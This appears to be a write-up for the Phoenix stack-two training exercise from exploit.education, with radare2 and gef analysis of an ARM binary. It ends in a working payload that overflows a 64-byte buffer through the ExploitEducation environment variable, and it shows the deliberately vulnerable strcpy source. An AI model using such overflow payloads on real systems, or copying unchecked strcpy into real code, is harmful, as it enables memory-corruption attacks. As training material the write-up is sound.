# Phoenix Stack2
## Static Analysis
##### Analyse the binary
`r2 -A stack-two`
##### Familiarity
```
[0x000104a8]> i
file     stack-two
format   elf
arch     arm
endian   little
```
##### Imports
```
[0x08048370]> ii
[Imports]
   1 0x0001043c  GLOBAL    FUNC strcpy
   2 0x00010448  GLOBAL    FUNC printf
   3 0x00010454  GLOBAL    FUNC getenv  <---
   5 0x00010460  GLOBAL    FUNC puts
   6 0x0001046c  GLOBAL    FUNC errx
  16 0x00010484  GLOBAL    FUNC exit
```
##### Run code
```
user@phoenix-arm64:/opt/phoenix/arm$ ./stack-two
stack-two: please set the ExploitEducation environment variable

user@phoenix-arm64:/opt/phoenix/arm$ ./stack-two AAA
stack-two: please set the ExploitEducation environment variable

ExploitEducation=AAAA ./stack-two
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
```
##### getenv API
> As typically implemented, getenv() returns a pointer to a string
>        within the environment list.  The caller must take care not to modify
>        this string, since that would change the environment of the process.

##### Example getenv code
```
int main(void)
{
    char *name = NULL;
    printf("name : %p\n", name);
    name = getenv("HOME");
    printf("name : %p\n", name);
    printf("name : %s\n", name);
    return 0;
}

name : 0x0
name : 0x7ffeefbff8d2
name : /Users/foobar
Program ended with exit code: 0
```
##### Interesting Strings
```
[0x000104a8]> fs strings;f
0x0001068c 74 str.Welcome_to_phoenix_stack_two__brought_to_you_by_https:__exploit.education
0x000106d8 17 str.ExploitEducation
0x000106ec 53 str.please_set_the_ExploitEducation_environment_variable
0x00010724 67 str.Well_done__you_have_successfully_set_changeme_to_the_correct_value
0x00010768 58 str.Almost__changeme_is_currently_0x_08x__we_want_0x0d0a090a
```
##### Solution
```
// Breakpoint strcpy call 0x000000000040082c <+88>:	bl	0x400610 <strcpy@plt>
b *0x000000000040082c

// Print Stack
x/32w $sp
0xfffffffffb70:	0x00000000	0x00000000	0xb7f7fab4	0x0000ffff
0xfffffffffb80:	0xfffffc28	0x0000ffff	0xb80000f8	0x00000002
0xfffffffffb90:	0x00000000	0x00000000	0x00400508	0x00000000
0xfffffffffba0:	0x00000000	0x00000000	0x004109d8	0x00000000
0xfffffffffbb0:	0x004109e0	0x00000000	0x00000008	0x00000000
0xfffffffffbc0:	0x00000008	0x00000000	0x00000000	0x00000000
0xfffffffffbd0:	0x00000000	0x00000000	0xffffff4d	0x0000ffff

// Step, to watch strpcy complete
gef> s

gef> x/32w $sp
0xfffffffffb70:	0x00000000	0x00000000	0xb7f7fab4	0x0000ffff
0xfffffffffb80:	0xfffffc28	0x0000ffff	0xb80000f8	0x00000002
0xfffffffffb90:	0x41414160	0x41414141	0x41414141	0x41414141
0xfffffffffba0:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffffffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffffffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffffffffbd0:	0x00006041	0x00000000	0xffffff4d	0x0000ffff

─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-two", stopped, reason: SINGLE STEP

// Print Stack
x/32w $sp
gef> c
Continuing.
Almost! changeme is currently 0x00006041, we want 0x0d0a090a
```
##### Watch Stack Variable with debugger
```
gef> set env ExploitEducation=`AAAA`
gef> r
Starting program: /opt/phoenix/arm/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a

[0x000104a8]> pdf @main
|           ;-- $a:
/ (fcn) main 140
|   main ();
            // The stack pointer that we will use to run the Buffer Overflow
|           ; var char *src @ fp-0x8
            // called to getenv with the ExploitEducation string
|           0x000105f8      6c009fe5       ldr r0, str.ExploitEducation ; [0x1066c:4]=0x106d8 str.ExploitEducation ; const char *name
|           0x000105fc      94ffffeb       bl sym.imp.getenv           ; char *getenv(const char *name)
|           0x00010600      08000be5       str r0, [src]               ; 0x8 ; 8
|           0x00010604      08301be5       ldr r3, [src]               ; 0x8 ; 8
|           0x00010608      000053e3       cmp r3, 0
|       ,=< 0x0001060c      0200001a       bne 0x1061c
|       |   0x00010610      58109fe5       ldr r1, str.please_set_the_ExploitEducation_environment_variable ; [0x10670:4]=0x106ec str.please_set_the_ExploitEducation_environment_variable
|       |   0x00010614      0100a0e3       mov r0, 1                   ; 1
|       |   0x00010618      93ffffeb       bl sym.imp.errx
|       |   ; CODE XREF from main (0x1060c)
|       `-> 0x0001061c      0030a0e3       mov r3, 0
|           0x00010620      0c300be5       str r3, [local_ch]          ; 0xc ; 12
|           0x00010624      4c304be2       sub r3, fp, 0x4c
|           0x00010628      08101be5       ldr r1, [src]               ; 0x8 ; 8 ; const char *src
|           0x0001062c      0300a0e1       mov r0, r3                  ; char *dest
|           0x00010630      81ffffeb       bl sym.imp.strcpy           ; char *strcpy(char *dest, const char *src)
|           0x00010634      0c301be5       ldr r3, [local_ch]          ; 0xc ; 12
|           0x00010638      34209fe5       ldr r2, [0x00010674]        ; [0x10674:4]=0xd0a090a
```
##### Answer
```
// Step 1 - Get past the NULL check if the "ExploitEducation" environment variable was set to nothing.

user@phoenix-arm64:/opt/phoenix/arm64$ ExploitEducation=AAAA ./stack-two

// Step 2 - Find Buffer Overflow

Almost! changeme is currently 0x00000000, we want 0x0d0a090a

ExploitEducation=$(python -c 'print "A"* 65')

Almost! changeme is currently 0x00000041, we want 0x0d0a090a

// Step 2 - Add in instruction
ExploitEducation=$(python -c 'print "A"* 64 + "\x0a\x09\x0a\x0d"') ./stack-two

Well done, you have successfully set changeme to the correct value
```
##### Learnings
The solution to this overflow is to craft a targeted `Environment Variable` called `ExploitEducation`.

Inside a debugger, it took a `environment variable` literally.  The below did not actually print 20 x A characters.  It printed exactly what was written.
```
gef> set env ExploitEducation=`perl -e 'print "A" x 20'`
```
Writing over a Literal String didn't work.  I tried to set replace `ExploitEducation` with `PATH`.  That way, the getenv call would return a valid pointer.
```
gef> set {char *} 0x0000000000400900 = "PATH"
gef> c
Continuing.
stack-two: please set the ExploitEducation environment variable
```
##### Source code
```
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```
